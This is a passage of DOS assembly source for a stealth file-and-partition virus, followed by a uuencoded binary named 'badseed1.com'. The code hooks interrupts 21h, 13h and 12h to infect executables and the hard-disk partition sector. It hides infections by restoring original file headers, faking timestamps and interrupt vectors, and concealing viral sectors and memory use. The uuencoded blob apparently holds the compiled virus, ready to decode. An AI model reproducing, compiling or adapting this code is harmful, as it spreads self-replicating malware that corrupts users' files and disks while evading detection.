                                        ;minus the number of header bytes already read

save_count:
        mov     ds:[offset scratch_area-begin+18h],cx

within_file:
        pop     ax
        pop     cx
        pop     dx
        pop     ds
        push    cx
        push    ax
        push    dx
        mov     cx,cs:[offset scratch_area-begin+18h]
        add     dx,cs:[offset scratch_area-begin+1ah]
                                        ;set buffer to allow for bytes from header area
        call    call_21h                ;operate on requested number of bytes minus header
        add     ax,cs:[offset scratch_area-begin+1ah]
                                        ;return count of actual requested number of bytes
        pop     dx
        pop     cx
        cmp     ch,3fh
        jz      quit_read
        push    ax
        push    dx
        mov     ax,5700h
        call    call_21h
        inc     al
        or      cl,1fh
        dec     cx
        call    call_21h                ;set 62 seconds
        pop     dx
        pop     ax

quit_read:
        pop     cx
        jmp     set_flags

restore_file:
        mov     ds:[offset scratch_area-begin+24h],1
        mov     ds:[offset scratch_area-begin+25h],bl
        mov     ax,4200h
        mov     cx,ds:[offset scratch_area-begin+22h]
        mov     dx,ds:[offset scratch_area-begin+20h]
        add     dx,offset exe_buffer-begin
        adc     cx,0
        call    call_21h                ;set file pointer to original header
        mov     ah,3fh
        mov     cx,18h
        mov     dx,offset scratch_area-begin
        call    call_21h                ;read original header into scratch area
        mov     ax,4200h
        mov     dx,ds:[offset scratch_area-begin+20h]
        mov     cx,ds:[offset scratch_area-begin+22h]
        call    call_21h                ;set file pointer to original end of file
        mov     ah,40h
        xor     cx,cx
        call    call_21h                ;truncate file to original length
        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        call    call_21h                ;set file pointer to beginning of file
        mov     ah,40h
        mov     cx,18h
        mov     dx,offset scratch_area-begin
        call    call_21h                ;restore original header to file
        mov     ax,4200h
        mov     dx,ds:[offset scratch_area-begin+1ch]
        mov     cx,ds:[offset scratch_area-begin+1eh]
        call    call_21h                ;restore current file pointer position
        pop     ax
        pop     cx
        pop     dx
        pop     ds
        jmp     short do_21h            ;complete write operation

check_psp:
        pop     bx
        pop     cx
        push    cx
        push    bx
        push    ax
        dec     cx
        mov     ds,cx
        mov     si,8
        cld
        lodsw
        xchg    bx,ax
        lodsw
        xchg    dx,ax
        pop     ax
        cmp     bx,4957h
        jnz     re_enable
        cmp     dx,4eh                  ;check if WIN is terminating
        jnz     re_enable
        dec     byte ptr cs:[offset windows_active-begin]

re_enable:
        jmp     short do_21h            ;re-enable infections

fix_time:
        push    ax
        push    cx
        push    dx
        mov     ax,5700h
        call    call_21h                ;get time
        push    ax
        push    cx
        call    check_seconds           ;test if infected
        pop     cx
        pop     ax
        pop     dx
        pop     cx
        pop     ax
        jnz     do_21h
        or      al,al
        jnz     set_time
        call    call_21h                ;get time
        and     cl,0e0h                 ;return 0 if infected

quit_get:
        jmp     set_flags

set_time:
        or      cl,1fh
        dec     cx                      ;set 62 seconds
        jnz     do_21h

call_21h:
        pushf
        db      2eh
        dw      1effh
        dw      offset cur21_addr-begin  ;call far cs:[cur21h]
        ret

do_21h: db      2eh
        dw      2effh
        dw      offset cur21_addr-begin ;jmp far cs:[cur21h]

exe_buffer:
        db      0e9h
        dw      offset exe_buffer-begin
        mov     ax,4c00h
        int     21h
        db      10h dup (0)

new_12h:
        push    ds
        push    es
        push    bx
        xor     ax,ax
        mov     ds,ax
        les     bx,cs:[offset old01_addr-begin]
        cli
        mov     ds:[48h],bx
        mov     ds:[4ah],es             ;restore interrupt 12h address
        sti
        pop     bx
        pop     es
        pop     ds
        int     12h
        add     ax,kilo_count           ;restore top of system memory value
        iret
        db      "10/23/92"

from_part:
        db      0

dis_part_start:
        
new_21h_2:                              ;new interrupt 21h handler
        cmp     ax,0eee7h
        jz      ret_gm
        cmp     ax,3513h                ;get interrupt 13h
        jz      get_13h
        cmp     ax,3521h                ;get interrupt 21h
        jz      get_21h
        cmp     ax,2513h                ;set interrupt 13h
        jz      set_13h
        cmp     ax,2521h                ;set interrupt 21h
        jz      set_21h
        db      2eh
        dw      2effh                   ;jmp far cs:[cur21h]
        dw      offset cur21_addr-dis_part_start+600h

ret_gm: mov     ax,0d703h
        iret

get_13h:
        les     bx,cs:[offset cur13_addr-dis_part_start+600h]
        iret                            ;restore original interrupt 13h handler

get_21h:
        les     bx,cs:[offset cur21_addr-dis_part_start+600h]
        iret                            ;restore original interrupt 21h handler

set_13h:
        mov     cs:[offset cur13_addr-dis_part_start+600h],dx
        mov     cs:[offset cur13_addr-dis_part_start+602h],ds
        iret                            ;save new interrupt 13h handler

set_21h:
        mov     cs:[offset cur21_addr-dis_part_start+600h],dx
        mov     cs:[offset cur21_addr-dis_part_start+602h],ds
        iret                            ;save new interrupt 21h handler

head_off:
        dw      0                       ;address of C: partition beginning

new_13h:                                ;new interrupt 13h handler starts here
        cmp     dx,80h                  ;check if accessing hard disk
        jnz     do_13h
        dw      0f983h
        db      sec_count+2             ;check if accessing viral code sectors
        jnb     do_13h
        cmp     ah,2                    ;read sector
        jz      partition_disinfect
        cmp     ah,3                    ;write sector
        jz      partition_disinfect

do_13h: db      2eh
        dw      2effh                   ;jmp far cs:[xxxx]

far_13_1:
        dw      0

partition_disinfect:
        cmp     cx,1
        jnz     vir_sectors
        cmp     ah,2
        jz      do_partition
        push    si
        call    get_offset
        mov     word ptr es:[bx+si],200h
        pop     si

do_partition:
        push    ax
        mov     al,1
        pushf
        db      2eh
        dw      1effh                   ;call far cs:[xxxx]

far_13_2:
        dw      0
        pop     ax
        cmp     ah,3
        jz      ok_partition
        push    si
        call    get_offset
        mov     word ptr es:[bx+si],101h
        pop     si
        cmp     al,1
        jz      ok_partition

vir_sectors:
        cmp     ah,3
        jz      ok_partition
        push    ax
        push    cx
        push    dx
        push    di
        xor     ah,ah
        mov     di,bx
        cmp     cx,1
        mov     cx,200h
        jnz     mulcx
        dec     ax
        add     di,cx

mulcx:  mul     cx
        or      dx,dx
        jz      zero_loop
        mov     cx,0

zero_loop:
        xchg    cx,ax
        cld

store_zero:
        stosb
        loop    store_zero
        pop     di
        pop     dx
        pop     cx
        pop     ax

ok_partition:
        clc
        xor     ah,ah

set_flags:
        push    ax
        lahf
        push    bp
        mov     bp,sp
        mov     [bp+8],ah               ;fix flags according to status
        pop     bp
        pop     ax
        iret

get_offset:
        call    find_13h

find_13h:
        pop     si
        sub     si,offset find_13h-begin
        mov     si,cs:[si+offset head_off-begin]
        ret

dis_part_end:

lastb:

old21_addr:
        dd      0

cur21_addr:
        dd      0

old01_addr:
        dd      0

cur13_addr:
        dd      0

old13_addr:
        dd      0

scratch_area:
        dw      100h dup (0)

end     begin

begin 775 badseed1.com
MZ(8`QP;^?0``@RX3!`/-$K$&T^".P+@%`KL#`KD#`,T3L.@S__RJN(8`J[D`
M`;X`?/.E)L<&70KB"B;'!GH*Y@HFQ@;^"0`FQ@8/"P"^$P$&5K@D`[X#`+_6
M"LL``````````%EO=2!C86XG="!C871C:"!T:&4@1VEN9V5R8G)E860@36%N
M(2&57@8>#A^XY^[-(3T#UW0<)HX&+`#\,_]6@<;-`KD(`/.FG.C,`YUT&UYU
M[.D#`4)A9"!3965D("T@36%D92!I;B!/6AX&'P>']_VMB\Y)@\<,K*H\7'7Z
M*\Y>#A^(C.("QH3["0$SP([`5H'&_`F_``:YUP#\\Z1>CMG'!EX&XP;'!GL&
MYP:X``;Z+H"\^PD`=1NXYP*'!B``JXS(AP8B`*O'!H8`___[@\<(ZR*'!H0`
MJY.,P(<&A@"KDZN3JXV$@0*'!@0`JXS(AP8&`*O[^`8>Q1Y,`(O#JXS8JW(,
M'@><#N@!`1\'^7+G'U8N@+S["0"<:\";\``0Y7I*4SP#/;,\DSTC/V,_^5RS/)CL&X`0*[`'RY`0"Z
M@`'-$P93RX/"$"X!5%\N`U1;CM(NBV19E2[_;%U')HD^1`:)O$`*N``".0%T
MGHD!#A_XN%6JAX3^`5!R&HE$!`X'N`$#N0$`NH``S'()N`8#B]ZY`@#,N```
MCL".V%;\^G,(ON,&OTP`I:5>5@X?@<:E`K\,`*6E^UZ/A/X!Z4O_G"Z`O/L)
M`'0%G;@``U`&4[0!LH#Z58OL4U",RXM&!#UP`'4#/`CMB!/H8``!!W*`965PX'C,B_
MW`K]^H<&A@"KN"0#AP:$`*L>!A\'B_>_(@"EI?M?7@=8'R[_+M8*'E`SP([8
MH00`.P8,`'4)H08`.P8.`'0$L(+F(5@?@/P1=`6`_!)U3>AD!H3`=44&4%.T
M4>A8!H[#)CL>%@!U,8O:B@=0M"_H1098_L!U`X/#!R:+1QL2+H`^ZP0!=`H]`3UU`O[`Z*4`
MZ=D%@/Q,=0/I?P6`_%=U`^F:!8#\6W0%/0!L=7$N@#[K!`%TVU-2/0!L=0N`
MRP*`X_Z+UNAN`%,&4%%65QX'Z%D`_8OWK*WHBP`NB`X."W4&02Z(#@X+7UY9
M6`=;6E#HP`\^+^C+`L8#\\J[#!E-15E<>4AX'4.CI_T]/
M#A^+#N4"ON0"_5>LBN"']R:LA_
MD``&4\<&D`!V!(P.D@#['E6+[,56"ET>4K@`0^@A!%%R-O;!`70'2;@!0^@2
M!+@"/>@,!'(BD[@`5^@#!'(4Z-`!=`]14N@R`%I9<@:X`5?H[0.T/NCH`UE:
M'W(+]L$!=`:X`4/HV`,?6UB)'I``HY(`6%H?7UY96P?##A^ZZ@JY&`"T/^BX
M`RO(=50>!Y&+\K^_"?SSI(OZOEP`Q$4.C`2)1`+$112)1`2,1`:(#@<+N%I-
M.P6&X'4"B04[!70$_@8'"[@"0HO1Z'0#<+`'0'/<;RY"0"+=01.,__1YM'7XOH[UU]UZ0-U`CMU&'7A/=8*@]H`+=0@S
M_]'FT=?B^BO&&]=?L0S3XHE%%(E5%H'"U`")11")50Z#10H<@.)
M10R+10(%U@I0@.0!B44"6+$)T^@!102ZZ@JY&`#K$[KJ"HOZQ@7I1RT#`!X'
M_*NY`P"T0.BA`G($.\%T`?G#+C@>#PMU/BZ`/@X+`74V+OX.#@L>!E!345)6
M5[@`0C/),]+H<`E]>6EE;6`
M4E%0#A^)#@(+,\F)#@0+N`%",]+H#0*C!@N)%@@+N`)",]+H_@$MU@J#V@"C
M"@N)%@P+6(#\0G4565H?48'JU@J#V0#HW0%9Z>,"Z2,!4+@`0HL6!@N+#@@+
MZ,P"T0#/)Z'0`N`!",\DSTNAJ`+1`N1@`NNH*
MZ%\`N`!"BQ8&"XL."`OH40!865H?ZU);65%34$F.V;X(`/RMDZV26('[5TEU
M"H/Z3G4%+OX.ZP3K+U!14K@`5^@?`%!1Z.S]65A:65AU&@K`=0GH#`"`X>#I
M$`&`R1])=0><+O\>V@K#+O\NV@KIOPFX`$S-(0`````````````````````>
M!E,SP([8+L0>W@KZB1Y(`(P&2@#[6P?N=!D]
M$S5T&#TA-709/1,E=!H](25T("[_+ML&N`/7SR[$'N,&SR[$'ML&SRZ)%N,&
M+HP>Y0;/+HD6VP8NC![=!L\``('Z@`!U#X/Y"',*@/P"=`J`_`-T!2[_+@``
M@_D!=2R`_`)T"E;H6P`FQP```EY0L`&<+O\>``!8@/P#=#A6Z$(`)L<``0%>
M/`%T*H#\`W0E4%%25S+DB_N#^0&Y``)U`T@#^??A"])T`[D``)'\JN+]7UI9
M6/@RY%"?58OLB&8(75C/Z```7H'NRPHNB[1#"L,`````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
5````````````````````````````
`
end
